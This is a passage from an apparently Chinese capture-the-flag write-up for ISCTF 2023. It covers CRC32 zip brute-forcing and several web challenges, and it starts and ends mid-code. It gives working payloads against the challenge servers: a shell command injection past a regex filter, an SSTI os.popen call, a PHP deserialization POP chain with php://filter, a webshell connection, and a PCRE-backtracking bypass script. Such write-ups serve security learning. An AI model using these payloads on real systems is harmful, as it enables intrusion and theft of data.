operator">==</span> target_crc<span class="token punctuation">:</span>                    data<span class="token operator">=</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Found matching data: {data}"</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Finished searching."</span><span class="token punctuation">)</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301749963.png"></p><p>爆破脚本来自该位大佬博客<a href="https://blog.csdn.net/mochu7777777/article/details/110206427">浅谈使用Python脚本爆破CRC32_crc32.py-CSDN博客</a></p><p>总结得到的信息如下图</p><pre><code>大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的坡大写的日大写的鹅伍思大写的特摸坡大写的迂得零壹大写的希大写的乌大写的希大写的日大写的坡大写的日大写的鹅大写的鹅壹大写的特科大写的摸巫大写的摸大写的佛勒大写的希大写的巫大写的希得大写的摸大写的迂大写的哥特肆大写的巫摸坡大写的佛得大写的鹅伍大写的鹅啊叁勒大写的喔大写的迂零大写的乌巫大写的特零得大写的哥啊科伍大写的喝大写的日大写的特大写的迂摸大写的乌大写的特零玖</code></pre><p>结合官方给的提示，<a href="https://www.xuezimu.com.cn/info/26zimu.php">https://www.xuezimu.com.cn/info/26zimu.php</a></p><p>可以获得一串base64代码</p><pre><code>U1ZORFZFWjdPRE5sTmpVd01XWXRPREE1TkMwMFlXWXdMVGt4WmpFdE5Ea3lOV0UwT0dGak5HRTVmUT09</code></pre><p>base64解密俩次获得flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301757384.png"></p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>第二种方法更快，用一个大佬的代码直接跑压缩包就得到结果了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> binascii<span class="token keyword">import</span> string<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdmfname_fcrc <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>fcrc_fnames <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>fcrc_value <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>archive <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>r<span class="token string">"C:\Users\HXY\Desktop\flag.zip"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在提取crc：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> fname <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>archive<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name_info <span class="token operator">=</span> archive<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>fname<span class="token punctuation">)</span>    fcrc <span class="token operator">=</span> name_info<span class="token punctuation">.</span>CRC    fname_fcrc<span class="token punctuation">[</span>fname<span class="token punctuation">]</span> <span class="token operator">=</span> fcrc    fcrc_fnames<span class="token punctuation">[</span>fcrc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> fname <span class="token keyword">in</span> fname_fcrc<span class="token punctuation">:</span>    fcrc <span class="token operator">=</span> fname_fcrc<span class="token punctuation">[</span>fname<span class="token punctuation">]</span>    fcrc_fnames<span class="token punctuation">[</span>fcrc<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在破解3字节长crc'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tempi <span class="token operator">=</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>tempi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        tempi <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> tempi    tempi <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>tempi<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tempj <span class="token operator">=</span> hex<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tempj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            tempj <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> tempj        tempj <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>tempj<span class="token punctuation">)</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tempk <span class="token operator">=</span> hex<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>tempk<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                tempk <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> tempk            tempk <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>tempk<span class="token punctuation">)</span>            fcrc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>tempi <span class="token operator">+</span> tempj <span class="token operator">+</span> tempk<span class="token punctuation">)</span>            <span class="token keyword">if</span> fcrc <span class="token keyword">in</span> fcrc_fnames<span class="token punctuation">:</span>                fcrc_value<span class="token punctuation">[</span>fcrc<span class="token punctuation">]</span> <span class="token operator">=</span> tempi <span class="token operator">+</span> tempj <span class="token operator">+</span> tempk<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'总crc个数：{len(fcrc_fnames)}，破解成功个数：{len(fcrc_value)}'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在将结果编码：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> fcrc <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>fcrc_value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> fname <span class="token keyword">in</span> fcrc_fnames<span class="token punctuation">[</span>fcrc<span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token punctuation">[</span>fname<span class="token punctuation">]</span> <span class="token operator">=</span> fcrc_value<span class="token punctuation">[</span>fcrc<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'编码结果：'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>f<span class="token string">'{i}.txt'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301758327.png"></p><p>相比第一种方法，快的不是一星半点</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301812056.png"></p><p>还有个flag.php的空文件</p><p>dirsearch坏了，体谅一下，下面是index.bak的源码</p><pre class=" language-json"><code class="language-json"> function string_to_int_array(str<span class="token punctuation">)</span><span class="token punctuation">{</span>        const intArr = <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        for(let i=<span class="token number">0</span><span class="token punctuation">;</span>i&lt;str.length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>          const charcode = str.charCodeAt(i<span class="token punctuation">)</span><span class="token punctuation">;</span>          const partA = Math.floor(charcode / <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          const partB = charcode % <span class="token number">26</span><span class="token punctuation">;</span>          intArr.push(partA<span class="token punctuation">)</span><span class="token punctuation">;</span>          intArr.push(partB<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        return intArr<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      function int_array_to_text(int_array<span class="token punctuation">)</span><span class="token punctuation">{</span>        let txt = ''<span class="token punctuation">;</span>        for(let i=<span class="token number">0</span><span class="token punctuation">;</span>i&lt;int_array.length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>          txt += String.fromCharCode(<span class="token number">97</span> + int_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        return txt<span class="token punctuation">;</span>      <span class="token punctuation">}</span>const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(parameter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>if(hash === 'dxdydxdudxdtdxeadxekdxea'<span class="token punctuation">)</span><span class="token punctuation">{</span>            window.location = 'flag.html'<span class="token punctuation">;</span>          <span class="token punctuation">}</span>else <span class="token punctuation">{</span>            document.getElementById('fail'<span class="token punctuation">)</span>.style.display = ''<span class="token punctuation">;</span>          <span class="token punctuation">}</span></code></pre><p>根据上述代码以及题我们可以得知本题不知晓参数，可以通过该代码逆向求解得到parameter</p><p>从而得到flag</p><pre class=" language-json"><code class="language-json">const hash = 'dxdydxdudxdtdxeadxekdxea'<span class="token punctuation">;</span>function string_to_int_array(str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    const intArr = <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    for (let i = <span class="token number">0</span><span class="token punctuation">;</span> i &lt; str.length<span class="token punctuation">;</span> i++<span class="token punctuation">)</span> <span class="token punctuation">{</span>        intArr.push(str.charCodeAt(i<span class="token punctuation">)</span> - <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    return intArr<span class="token punctuation">;</span><span class="token punctuation">}</span>function int_array_to_string(int_array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    let str = ''<span class="token punctuation">;</span>    for (let i = <span class="token number">0</span><span class="token punctuation">;</span> i &lt; int_array.length<span class="token punctuation">;</span> i += <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        const charcode = int_array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> * <span class="token number">26</span> + int_array<span class="token punctuation">[</span>i + <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        str += String.fromCharCode(charcode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    return str<span class="token punctuation">;</span><span class="token punctuation">}</span>console.log(int_array_to_string(string_to_int_array(int_array_to_string(string_to_int_array(hash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301825901.png"></p><p>得到参数为   <strong>mihoyo</strong> 然后直接php伪协议读取flag.php得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301827353.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301827606.png"></p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a>fuzz!</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*Read /flaggggggg.txtHint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> 'file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///etc/passwd';</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\'|\"|\;|\&lt;|\>|\,|\?|jay/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'你需要fuzz一下哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/fi|le|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'curl '</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>一共有俩个过滤，第一个匹配过滤 ‘file’ 参数的值中是否包含一些特定的字符。这些字符包括**&#96; \ ~ ! @ # $ % ^ &amp; * ( ) _ + &#x3D; \ ‘ “ ; &lt; &gt; , ?** 以及字母序列 “<strong>jay</strong>“，不区分大小写（i标志）。如果匹配上就触发die函数</p><p>第二个过滤如果 ‘file’ 参数的值不匹配上述正则表达式，即不包含 “fi”、”le” 或 “flag”，则执行接下来的代码块。</p><p>先通过一个fuzz测试来看看我们还有哪些字符可用</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 使用正则表达式检查过滤字符</span>    <span class="token variable">$char</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[`~!@#\$%\^&amp;*\(\)_\+=\\\'\";&lt;>,\?]|jay/i"</span><span class="token punctuation">,</span> <span class="token variable">$char</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$char</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p> -.&#x2F;0123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ[]abcdefghijklmnopqrstuvwxyz{|}</p></blockquote><p>发现除去数字和字母就**空格-.&#x2F;[]|{|}**可用了</p><p>所以我们可以构造**url+?file&#x3D;|ls &#x2F;**先看看是否有回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301935794.png"></p><p>在构造<strong>url+?file&#x3D;|cat &#x2F;fl[a]ggggggg.txt</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301938128.png"></p><p>那么构造**?file&#x3D;|cat &#x2F;fl[a]g**   从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301937382.png"></p><p>当时由于课程问题没写，现在我也不知道哪个是对的flag</p><p>至于[]，则是在 Unix&#x2F;Linux 系统的命令行中，方括号 <code>[]</code> 通常用于表示字符范围。我这里直接使其范围为[a]了，一般也可以[a-z]也是能得到正确flag</p><h3 id="恐怖G7人"><a href="#恐怖G7人" class="headerlink" title="恐怖G7人"></a>恐怖G7人</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301946995.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301946412.png"></p><p>发现回显为2，说明可以ssti注入</p><pre><code>&amp;#123&amp;#123cycler.__init__.__globals__.os.popen(&#39;env&#39;).read()&amp;#125&amp;#125</code></pre><p>查看当前环境变量得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302006231.png"></p><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a>圣杯战争!!!</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">artifact</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$excalibuer</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$arrow</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"为Saber选择了对的武器!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">excalibuer</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arrow</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">prepare</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$release</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$functioin</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">release</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"蓄力!咖喱棒！！&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$functioin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">saber</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$weapon</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"胜利！&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">weapon</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">summon</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$Saber</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token variable">$Rider</span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"开始召唤从者！&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Saber</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>显而易见，这是一道pop链的题</p><p>pop链的构成为:    summon -&gt; artifact -&gt; prepare -&gt; saber</p><p>所以我们可以写出以下的代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">summon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">artifact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">saber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> Saber <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> excalibuer <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">-</span><span class="token operator">></span> release <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">-</span><span class="token operator">></span> weapon <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302028831.png"></p><p>执行得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302028656.png"></p><p>base64解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302026901.png"></p><h3 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h3><p>打开是一句话木马，通过蚁剑可以连接进去</p><p>第一段flag在flag.php里</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302036029.png"></p><p>第二个flag在根目录里</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302037752.png"></p><p>第三个flag需要用终端echo出来</p><p>可以从红色文件得知</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302037216.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302038876.png"></p><p>至此，将三段flag拼接即为正确答案</p><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pan_gu'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zhurong'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$lida1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hongmeng'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$lida2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shennong'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$lida1</span> <span class="token operator">!==</span> <span class="token variable">$lida2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$lida1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$lida2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"md5绕过了!"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'你干嘛?哎哟!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/.+?ISCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再想想!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token string">'2023ISCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"就差一点点啦!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>第一个判断可以通过数组绕过，第二个intval函数也可以通过数组绕过，最后一个if判断可以通过代码pcre回溯进行绕过</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://43.249.195.138:21763/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=1"</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'pan_gu'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'2023ISCTF'</span><span class="token punctuation">}</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token 